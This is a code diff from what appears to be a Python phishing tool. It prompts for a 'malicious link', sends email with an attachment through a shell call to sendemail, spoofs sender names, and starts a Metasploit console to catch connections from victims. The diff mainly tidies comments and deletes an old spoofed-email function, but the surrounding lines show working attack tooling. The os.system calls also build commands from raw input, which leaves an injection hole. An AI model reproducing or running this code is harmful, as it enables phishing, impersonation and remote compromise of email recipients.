@@ -33,7 +33,7 @@ def banner ():
 
 
 '||\   /||`              '||`    .|'''|          '||`               ||   
- ||\\.//||           ''   ||     ||               ||          ''    ||   
+ ||\\.//||           ''    ||     ||               ||          ''    ||   
  ||     ||   '''|.   ||   ||     `|'''|, '||''|,  ||  .|''|,  ||  ''||'' 
  ||     ||  .|''||   ||   ||      .   ||  ||  ||  ||  ||  ||  ||    ||   
 .||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
@@ -259,6 +259,7 @@ def sendMail(server, toAddr, address, username, password, subject, message, good
 					# Send the mail
                                         os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -a " + attachment + " -o message-content-type=html -o message-file=" + customHTML + " -xu " + username + " -xp " + password + " -s " + server + " -o tls=yes")
                                         listenForConnections()
+	
 
 		except KeyboardInterrupt:
 			color_print("\nThanks, Happy hacking", color='blue')
@@ -277,30 +278,7 @@ def getLink ():
 	time.sleep(2)
 	link = raw_input("\nPaste your malicious link: \n")		
 	while len(link) == 0: link = raw_input("Paste your malicious link: ")
-	return link
-
-#def sendEmail (server, fromAddr, toAddr, spoofName, subject, message):
-#
-#	# Get the link
-#	link = getLink()
-#	# Create the specially crafted link.
-#	html = '<a href="'+link+'">'+link+'</a>'
-#
-#
-#	# Print out a thew important messages.
-#	color_print("[+] Sending email to " + toAddr, color='blue')
-#	time.sleep(2)
-#	color_print("[+] Spoofing email " + spoofName, color='yellow')
-#	time.sleep(2)
-#	color_print("[*] Sending malicious link..", color='yellow')
-#	time.sleep(1)
-#
-#	# Send the message.
-#	server.send(fromAddr, subject, [message, html])
-#	color_print("\n[*] Email sent", color='green')
-#
-#	listenForConnections()
-	
+	return link	
 
 #
 # Listen for a connection
@@ -334,6 +312,9 @@ def listenForConnections ():
 			os.system('cat resource.rc')
 			os.system('msfconsole -r resource.rc')
 		else:
+			#######################################################
+			# This call is still in development
+			#######################################################
 			#color_print("[+] Generated a report..", color='green')
 			#if isUsingMessenger == False:
 			#	generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
@@ -346,8 +327,9 @@ def listenForConnections ():
 		return
 
 
-
-# Generate a html report
+#######################################################
+# This function is still in development
+#######################################################
 def generateMessengerReport(fbuser, fbuserID, message, link):		
 		f = open("reports/" + fbuser + ".html", "w")
 		f.write("""
@@ -375,7 +357,9 @@ def generateMessengerReport(fbuser, fbuserID, message, link):
 </html>""")
 		f.close()	
 
-# Generate a html report
+#######################################################
+# This function is still in development
+#######################################################
 def generateMailReport(fromemail, toemail, spoofemail, subject, message, link):		
 		f = open("reports/" + toemail + ".html", "w")
 		f.write("""
